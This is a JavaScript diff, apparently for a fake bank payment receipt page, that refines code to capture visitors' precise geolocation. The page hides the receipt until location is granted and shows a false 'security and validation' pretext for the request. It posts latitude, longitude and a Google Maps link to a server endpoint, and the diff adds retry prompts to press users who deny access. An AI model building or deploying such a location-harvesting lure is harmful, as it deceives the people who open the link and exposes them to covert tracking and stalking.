@@ -10,6 +10,18 @@ const currencyFormatter = new Intl.NumberFormat("pt-BR", {
     currency: "BRL"
 });
 
+const estadoCarregamento = document.getElementById("estado-carregamento");
+const estadoErroPermissao = document.getElementById("estado-erro-permissao");
+const estadoErroTimeout = document.getElementById("estado-erro-timeout");
+const estadoErroGenerico = document.getElementById("estado-erro-generico");
+const conteudoComprovante = document.getElementById("conteudo-comprovante");
+const botaoTentarPermissao = document.getElementById("botao-tentar-permissao");
+const botaoEmitirNovamente = document.getElementById("botao-emitir-novamente");
+const botaoTentarGenerico = document.getElementById("botao-tentar-generico");
+
+let isProcessing = false;
+let permissionRequested = false;
+
 if (!receiptData) {
     window.location.replace("/");
 } else {
@@ -20,28 +32,91 @@ if (!receiptData) {
     const dia = String(dataAtual.getDate()).padStart(2, "0");
     const mes = String(dataAtual.getMonth() + 1).padStart(2, "0");
     const ano = dataAtual.getFullYear();
-
     document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
 
-    window.addEventListener("load", () => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-                maximumAge: 60000,
-                timeout: 5000,
-                enableHighAccuracy: true
+    iniciarFluxoValidacao();
+}
+
+function iniciarFluxoValidacao() {
+    mostrarEstado("carregamento");
+    isProcessing = false;
+    permissionRequested = false;
+
+    if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: 'geolocation' })
+            .then(permissionStatus => {
+                if (permissionStatus.state === 'granted') {
+                    obterLocalizacao();
+                } else if (permissionStatus.state === 'denied') {
+                    mostrarEstado("erro-permissao");
+                } else {
+                    mostrarMensagemSeguranca();
+                    obterLocalizacao();
+                }
+            })
+            .catch(() => {
+                obterLocalizacao();
             });
-        } else {
-            alert("Algo deu errado. Tente novamente mais tarde.");
+    } else {
+        obterLocalizacao();
+    }
+}
+
+function mostrarMensagemSeguranca() {
+    const mensagemCarregamento = document.querySelector("#estado-carregamento p");
+    if (mensagemCarregamento) {
+        mensagemCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
+    }
+}
+
+function obterLocalizacao() {
+    if (!navigator.geolocation) {
+        mostrarEstado("erro-generico");
+        return;
+    }
+
+    isProcessing = true;
+    mostrarEstado("carregamento");
+
+    navigator.geolocation.getCurrentPosition(
+        sendLocation,
+        handleGeoError,
+        {
+            enableHighAccuracy: true,
+            maximumAge: 60000
         }
-    });
+    );
+}
+
+function handleGeoError(error) {
+    isProcessing = false;
+
+    console.error("Erro de geolocalização:", error);
+
+    switch (error.code) {
+        case error.PERMISSION_DENIED:
+            mostrarEstado("erro-permissao");
+            break;
+
+        case error.TIMEOUT:
+            mostrarEstado("erro-timeout");
+            break;
+
+        case error.POSITION_UNAVAILABLE:
+        default:
+            mostrarEstado("erro-generico");
+            break;
+    }
 }
 
 function sendLocation(position) {
+    isProcessing = false;
+    
     const latitude = position.coords.latitude;
     const longitude = position.coords.longitude;
     const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    const API_URL = "https://comprovante-bank.vercel.app/api/send-location";
+    const API_URL = "/api/send-location";
 
     fetch(API_URL, {
         method: "POST",
@@ -50,18 +125,67 @@ function sendLocation(position) {
         },
         body: JSON.stringify({ latitude, longitude, maps })
     })
-        .then(response => response.json())
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+        })
         .then(data => {
-            if (!data.success) {
-                alert("Erro ao enviar o comprovante.");
+            if (data.success) {
+                mostrarEstado("comprovante");
+            } else {
+                mostrarEstado("erro-generico");
             }
         })
         .catch(error => {
-            console.error("Erro:", error);
+            console.error("Erro ao enviar:", error);
+            mostrarEstado("erro-generico");
         });
 }
 
-function handleError(error) {
-    console.error("Erro:", error);
-    alert("Erro ao obter a localização: " + error.message);
+function mostrarEstado(estado) {
+    estadoCarregamento.hidden = true;
+    estadoErroPermissao.hidden = true;
+    estadoErroTimeout.hidden = true;
+    estadoErroGenerico.hidden = true;
+    conteudoComprovante.hidden = true;
+
+    switch (estado) {
+        case "carregamento":
+            estadoCarregamento.hidden = false;
+            const msgCarregamento = document.querySelector("#estado-carregamento p");
+            if (msgCarregamento && !permissionRequested) {
+                msgCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
+            }
+            break;
+
+        case "erro-permissao":
+            estadoErroPermissao.hidden = false;
+            break;
+
+        case "erro-timeout":
+            estadoErroTimeout.hidden = false;
+            break;
+
+        case "erro-generico":
+            estadoErroGenerico.hidden = false;
+            break;
+
+        case "comprovante":
+            conteudoComprovante.hidden = false;
+            break;
+    }
 }
+
+botaoTentarPermissao.addEventListener("click", () => {
+    window.location.reload();
+});
+
+botaoEmitirNovamente.addEventListener("click", () => {
+    window.location.reload();
+});
+
+botaoTentarGenerico.addEventListener("click", () => {
+    window.location.reload();
+});
